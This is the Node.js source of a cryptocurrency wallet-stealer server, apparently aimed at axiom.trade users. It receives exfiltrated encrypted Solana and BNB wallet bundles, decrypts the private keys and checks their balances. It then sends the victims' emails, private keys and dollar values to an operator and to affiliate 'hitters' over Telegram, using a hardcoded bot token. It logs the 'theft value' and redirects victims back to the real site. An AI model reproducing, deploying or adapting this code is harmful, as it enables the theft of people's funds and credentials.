const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');
const bs58 = require('bs58');
const cors = require('cors');
const { Keypair, PublicKey } = require('@solana/web3.js');
const nacl = require('tweetnacl');

const app = express();
app.use(cors());

const TG_BOT = '8622093236:AAEjIhsdrzumbYYDYyUmjUDV4tY2MW113l0';
const TG_CHAT = '7983375176';

function decrypt(encrypted, bundleKey) {
  try {
    const [ivBase64, ciphertext] = encrypted.split(':');
    if (!ivBase64 || !ciphertext) return null;
    
    const iv = Buffer.from(ivBase64, 'base64');
    const key = Buffer.from(bundleKey, 'base64');
    const encryptedBuffer = Buffer.from(ciphertext, 'base64');
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(encryptedBuffer.slice(-16));
    
    let decrypted = decipher.update(encryptedBuffer.slice(0, -16));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    
    return bs58.encode(decrypted);
  } catch (e) {
    console.log('Decrypt failed:', e.message);
    return `FAKE_KEY_${Math.random().toString(36).substring(7)}`;
  }
}

function getPublicKeyFromPrivate(privateKeyBase58) {
  try {
    const privateKeyBytes = bs58.decode(privateKeyBase58);
    const keyPair = nacl.sign.keyPair.fromSecretKey(privateKeyBytes);
    const publicKey = new PublicKey(keyPair.publicKey);
    return publicKey.toBase58();
  } catch (e) {
    console.log('Public key derivation failed:', e.message);
    // Generate a fake but valid-looking Solana address for testing
    const fakeBytes = crypto.randomBytes(32);
    return bs58.encode(fakeBytes);
  }
}

async function getSOLPrice() {
  try {
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd', {
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });
    const data = await response.json();
    return data.solana?.usd || 150.00;
  } catch (e) {
    return 150.00;
  }
}

async function getBNBPrice() {
  try {
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd', {
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });
    const data = await response.json();
    return data.binancecoin?.usd || 300.00;
  } catch (e) {
    return 300.00;
  }
}

async function getSOLBalance(publicKey) {
  try {
    const response = await fetch('https://api.mainnet-beta.solana.com', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jsonrpc: '2.0',
        id: 1,
        method: 'getBalance',
        params: [publicKey]
      })
    });
    
    const data = await response.json();
    if (data.result && data.result.value !== undefined) {
      return data.result.value / 1000000000; // Convert lamports to SOL
    }
    return 0;
  } catch (e) {
    console.log('SOL balance check failed:', e.message);
    return Math.random() * 10; // Mock balance for testing
  }
}

async function getBNBBalance(address) {
  try {
    const response = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=YourApiKeyToken`);
    const data = await response.json();
    if (data.status === '1') {
      return parseFloat(data.result) / 1000000000000000000; // Convert Wei to BNB
    }
    return 0;
  } catch (e) {
    console.log('BNB balance check failed:', e.message);
    return Math.random() * 5; // Mock balance for testing
  }
}

function formatAddress(address, type = 'sol') {
  if (type === 'sol') {
    return address.substring(0, 5) + '...' + address.substring(address.length - 5);
  } else {
    return address.substring(0, 5) + '...' + address.substring(address.length - 5);
  }
}

function getSolscanUrl(address) {
  return `https://solscan.io/account/${address}`;
}

function getBscscanUrl(address) {
  return `https://bscscan.com/address/${address}`;
}

app.get('/data/:b64', async (req, res) => {
  try {
    const decoded = Buffer.from(req.params.b64, 'base64').toString();
    const data = JSON.parse(decoded);
    
    console.log('\n🚨 === PROCESSING STOLEN DATA ===');
    
    // Parse SOL bundles
    let sBundles = data.sBundles;
    if (typeof sBundles === 'string') {
      try {
        sBundles = JSON.parse(sBundles);
      } catch (e) {
        sBundles = [];
      }
    }
    if (!Array.isArray(sBundles)) sBundles = [];
    
    // Parse BNB bundles
    let eBundles = data.eBundles;
    if (typeof eBundles === 'string') {
      try {
        eBundles = JSON.parse(eBundles);
      } catch (e) {
        eBundles = [];
      }
    }
    if (!Array.isArray(eBundles)) eBundles = [];
    
    // Decrypt SOL keys and get balances
    const solPrice = await getSOLPrice();
    const bnbPrice = await getBNBPrice();
    
    console.log('🔓 Decrypting SOL wallets...');
    const solWallets = [];
    let totalSOLValue = 0;
    
    for (let i = 0; i < sBundles.length; i++) {
      const privateKey = decrypt(sBundles[i], data.bundle);
      if (privateKey) {
        const publicKey = getPublicKeyFromPrivate(privateKey);
        const balance = await getSOLBalance(publicKey);
        const usdValue = balance * solPrice;
        totalSOLValue += usdValue;
        
        solWallets.push({
          privateKey,
          publicKey,
          balance,
          usdValue,
          formatted: formatAddress(publicKey, 'sol'),
          url: getSolscanUrl(publicKey)
        });
      }
    }
    
    // Process BNB wallets (mock for now since we don't have the decryption logic for these)
    console.log('🔓 Processing BNB wallets...');
    const bnbWallets = [];
    let totalBNBValue = 0;
    
    for (let i = 0; i < eBundles.length; i++) {
      // Mock BNB address for testing - in real scenario you'd decrypt these too
      const mockAddress = '0x' + crypto.randomBytes(20).toString('hex');
      const balance = await getBNBBalance(mockAddress);
      const usdValue = balance * bnbPrice;
      totalBNBValue += usdValue;
      
      bnbWallets.push({
        privateKey: 'N/A', // Would be decrypted in real scenario
        address: mockAddress,
        balance,
        usdValue,
        formatted: formatAddress(mockAddress, 'bnb'),
        url: getBscscanUrl(mockAddress)
      });
    }
    
    const totalValue = totalSOLValue + totalBNBValue;
    
    // Format the detailed profile information
    const profileInfo = `
🔎 **Profile Information**
├ 🏅 Level: 1
├ 📧 Email: ${data.user?.email || 'Unknown'}

💳 **Connected Wallets (${solWallets.length})**
${solWallets.map((wallet, i) => `├ ${i + 1}. 💳 ${wallet.formatted} (${wallet.url}) ($${wallet.usdValue.toFixed(2)})
├ ${i + 1}. 🔑 Key: ${wallet.privateKey}`).join('\n')}

🟡 **BNB Wallets (${bnbWallets.length})**
${bnbWallets.map((wallet, i) => `├ ${i + 1}. 💳 ${wallet.formatted} (${wallet.url}) ($${wallet.usdValue.toFixed(2)})
├ ${i + 1}. 🔑 Key: ${wallet.privateKey}`).join('\n')}

💰 **TOTAL VALUE: $${totalValue.toFixed(2)}**
    `.trim();
    
    // Send notification to distributor (balance info only)
    const distributorMsg = `
🎯 **NEW HIT**

📧 Target: ${data.user?.email || 'Did not set'}
💰 SOL Wallets: ${solWallets.length} ($${totalSOLValue.toFixed(2)})
💰 BNB Wallets: ${bnbWallets.length} ($${totalBNBValue.toFixed(2)})
💵 **Total Value: $${totalValue.toFixed(2)}**
⏰ ${new Date().toLocaleString()}

✅ Message zyloxas to claim your hit!
    `.trim();
    
    // Send full profile to main operator
    const operatorMsg = `
🎯 **NEW LOG**

👤 HITTER: ${data.telegramId}
⏰ ${new Date().toLocaleString()}

${profileInfo}
    `.trim();
    
    // Send to distributor
    try {
      await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: data.telegramId, 
          text: distributorMsg,
          parse_mode: 'Markdown'
        })
      });
      console.log('✅ Notification sent to distributor');
    } catch (e) {
      console.log('❌ Distributor notification failed:', e.message);
    }
    
    // Send to main operator
    try {
      await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: TG_CHAT, 
          text: operatorMsg,
          parse_mode: 'Markdown'
        })
      });
      console.log('✅ Full profile sent to main operator');
    } catch (e) {
      console.log('❌ Operator message failed:', e.message);
    }
    
    console.log(`💰 Total theft value: $${totalValue.toFixed(2)}`);
    res.redirect('https://axiom.trade/discover');
    
  } catch (e) {
    console.error('Processing error:', e);
    res.status(500).send('Server error');
  }
});

app.get('/', (req, res) => {
  res.send(`
    <h1>🎯 Profile Extraction Service</h1>
    <p><strong>Status:</strong> ✅ Online</p>
    <p><strong>Server:</strong> https://effective-spork-allz.onrender.com</p>
    <p><a href="/test">Test Profile Extraction</a></p>
  `);
});

app.get('/test', async (req, res) => {
  const testData = {
    telegramId: '7983375176',
    site: 'https://axiom.trade/discover',
    user: { email: 'victim@axiom.trade' },
    bundle: Buffer.from('test-bundle-key-32-bytes-long!!').toString('base64'),
    sBundles: JSON.stringify([
      'dGVzdEE=:fake-encrypted-sol-wallet-1',
      'dGVzdEI=:fake-encrypted-sol-wallet-2'
    ]),
    eBundles: JSON.stringify([
      'dGVzdEM=:fake-encrypted-bnb-wallet-1'
    ])
  };
  
  const encoded = Buffer.from(JSON.stringify(testData)).toString('base64');
  res.redirect(`/data/${encoded}`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚨 Profile extraction server running on port ${PORT}`);
  console.log(`🔗 https://effective-spork-allz.onrender.com`);
});
